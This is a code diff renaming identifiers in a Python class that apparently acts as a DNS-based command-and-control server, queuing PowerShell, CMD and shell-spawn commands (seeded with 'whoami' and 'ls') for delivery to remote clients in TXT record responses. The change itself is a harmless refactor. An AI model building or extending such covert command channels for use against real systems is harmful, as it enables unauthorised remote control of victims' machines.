@@ -8,10 +8,11 @@ class DNSHandler():
     RR = {
         "TXT": (dnslib.QTYPE.TXT, dnslib.TXT)
     }
+
     command_type = {
         "NONE": 0,
-        "POWERSHELL_EXECUTE": 1,
-        "CMD_EXECUTE": 2,
+        "POWERSHELL": 1,
+        "CMD": 2,
         "SPAWN_SHELL": 3
     }
 
@@ -23,7 +24,7 @@ class DNSHandler():
         self.name = name
         self.record_type = rrtype
         self.latest_request_id = None
-        self.queued_commands = [("POWERSHELL_EXECUTE", "whoami"), ("POWERSHELL_EXECUTE", "ls")]
+        self.queued_commands = [("POWERSHELL", "whoami"), ("POWERSHELL", "ls")]
         self.sent_commands = []
     
     def __repr__(self):
@@ -31,7 +32,7 @@ class DNSHandler():
     
 
     """ Handler functions """
-    def queue_cmd(self, cmd_type, cmd):
+    def queue_command(self, cmd_type, cmd):
         self.queued_commands.append((self.command_type[cmd_type], cmd))
 
 
@@ -42,12 +43,12 @@ class DNSHandler():
             if request.header.id != self.latest_request_id:
                 if request.header.get_opcode() == 0:
                     self.latest_request_id = request.header.id
-                    self.send_cmd(request)
+                    self.send_command(request)
         except dnslib.DNSError:
             print("[INFO] Incorrectly formatted DNS Query. Skipping")
     
 
-    def send_cmd(self, request):
+    def send_command(self, request):
         if self.queued_commands:
             opcode, cmd = self.queued_commands.pop()
         else:
